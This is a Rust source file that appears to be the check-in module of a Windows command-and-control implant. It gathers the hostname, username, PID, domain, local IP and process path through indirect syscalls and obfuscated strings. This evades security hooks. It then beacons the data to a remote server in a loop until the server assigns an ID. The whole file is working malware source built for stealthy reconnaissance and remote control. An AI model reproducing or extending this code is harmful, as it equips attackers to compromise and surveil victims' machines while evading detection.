use obfstr::obfstr;
use crate::config;
use crate::transport;
use callghost::syscall;

use ntapi::ntpsapi::{PROCESS_BASIC_INFORMATION, ProcessBasicInformation};
use std::{mem::{size_of, zeroed}, ptr};

use winapi::shared::minwindef::DWORD;
use winapi::um::winnt::{TOKEN_USER, TokenUser, TOKEN_QUERY, SID_NAME_USE};
use winapi::um::winbase::LookupAccountSidW;
use winapi::um::winnt::PSID;
use windows_sys::Win32::Foundation::FALSE;
use std::ffi::OsString;
use std::os::windows::ffi::OsStringExt;

use winapi::shared::ntdef::{UNICODE_STRING, WCHAR};

const CURRENT_PROCESS: isize = -1; // NtCurrentProcess

#[repr(C)]
struct SYSTEM_COMPUTER_NAME_INFORMATION {
    Name: UNICODE_STRING,
}

pub fn get_hostname_syscall() -> Option<String> {
    unsafe {
        let mut buffer = [0u16; 256];
        let unicode = UNICODE_STRING {
            Length: 0,
            MaximumLength: (buffer.len() * 2) as u16,
            Buffer: buffer.as_mut_ptr() as *mut WCHAR,
        };

        let mut info = SYSTEM_COMPUTER_NAME_INFORMATION { Name: unicode };

        // SystemComputerNameInformation = 112
        let status = syscall!(
            indirect,
            NtQuerySystemInformation,
            112u32,
            &mut info as *mut _ as *mut u8,
            size_of::<SYSTEM_COMPUTER_NAME_INFORMATION>() as u32,
            ptr::null_mut::<u32>()
        );

        if status != 0 || info.Name.Length == 0 {
            return None;
        }

        let hostname = OsString::from_wide(std::slice::from_raw_parts(
            info.Name.Buffer,
            (info.Name.Length / 2) as usize,
        ));
        Some(hostname.to_string_lossy().into_owned())
    }
}

fn get_pid_via_syscall() -> u32 {
    unsafe {
        let mut pbi: PROCESS_BASIC_INFORMATION = zeroed();
        let mut ret_len: u32 = 0;

        let status = syscall!(
            indirect,
            NtQueryInformationProcess,
            CURRENT_PROCESS,
            ProcessBasicInformation as u32,
            &mut pbi as *mut _ as *mut u8,
            size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            &mut ret_len
        );

        if status == 0 {
            pbi.UniqueProcessId as u32
        } else {
            0
        }
    }
}

fn get_current_username_syscall_direct() -> Result<String, String> {
    unsafe {
        let mut token_handle: *mut core::ffi::c_void = ptr::null_mut();
        let status = syscall!(
            indirect,
            NtOpenProcessToken,
            CURRENT_PROCESS,
            TOKEN_QUERY as u32,
            &mut token_handle
        );

        if status != 0 {
            return Err(format!("NtOpenProcessToken failed: 0x{:X}", status as u32));
        }

        let mut return_length = 0u32;
        let _ = syscall!(
            indirect,
            NtQueryInformationToken,
            token_handle,
            TokenUser as u32,
            ptr::null_mut::<u8>(),
            0u32,
            &mut return_length
        );

        let mut buffer = vec![0u8; return_length as usize];
        let token_user = buffer.as_mut_ptr() as *mut TOKEN_USER;

        let status = syscall!(
            indirect,
            NtQueryInformationToken,
            token_handle,
            TokenUser as u32,
            buffer.as_mut_ptr(),
            return_length,
            &mut return_length
        );

        crate::nt_mem::close_handle(token_handle);

        if status != 0 {
            return Err(format!("NtQueryInformationToken failed: 0x{:X}", status as u32));
        }

        let mut name = [0u16; 256];
        let mut domain = [0u16; 256];
        let mut name_len = name.len() as DWORD;
        let mut domain_len = domain.len() as DWORD;
        let mut sid_use = SID_NAME_USE::default();

        if LookupAccountSidW(
            ptr::null_mut(),
            (*token_user).User.Sid as PSID,
            name.as_mut_ptr(),
            &mut name_len,
            domain.as_mut_ptr(),
            &mut domain_len,
            &mut sid_use,
        ) == FALSE {
            return Err(format!("LookupAccountSidW failed: {}", std::io::Error::last_os_error()));
        }

        let username = OsString::from_wide(&name[..name_len as usize]);
        Ok(username.to_string_lossy().into_owned())
    }
}

pub fn checkin() {
    let hostname = get_hostname_syscall()
        .or_else(|| std::env::var("COMPUTERNAME").ok())
        .unwrap_or_else(|| "Unknown".to_string());

    let username = get_current_username_syscall_direct()
        .unwrap_or_else(|_| std::env::var("USERNAME").unwrap_or_else(|_| "Unknown".to_string()));

    let ips: Vec<String> = std::net::UdpSocket::bind("0.0.0.0:0")
        .and_then(|s| { s.connect("8.8.8.8:80")?; s.local_addr() })
        .map(|a| vec![a.ip().to_string()])
        .unwrap_or_default();

    let checkin_data = serde_json::json!({
        obfstr!("action"): obfstr!("checkin"),
        obfstr!("uuid"): *config::UUID,
        obfstr!("os"): "windows",
        obfstr!("user"): username,
        obfstr!("host"): hostname,
        obfstr!("pid"): get_pid_via_syscall(),
        obfstr!("architecture"): "x64",
        obfstr!("domain"): std::env::var("USERDOMAIN").unwrap_or_default(),
        obfstr!("ips"): ips,
        obfstr!("integrity_level"): 2,
        obfstr!("external_ip"): "",
        obfstr!("process_name"): std::env::current_exe()
            .map(|p| p.to_string_lossy().to_string())
            .unwrap_or_default(),
    });

    let json_str = serde_json::to_string(&checkin_data).unwrap();

    crate::helpers::churn(hostname.as_str());
    crate::helpers::churn(username.as_str());

    loop {
        match transport::send_request_with_response(&json_str) {
            Ok(resp) => {
                if let Some(id) = resp.get("id").and_then(|v| v.as_str()) {
                    crate::helpers::churn(id);
                    let mut uuid = config::UUID.write().unwrap();
                    *uuid = id.to_string();
                    return;
                }
            }
            Err(_) => {}
        }
        crate::helpers::idle();
    }
}
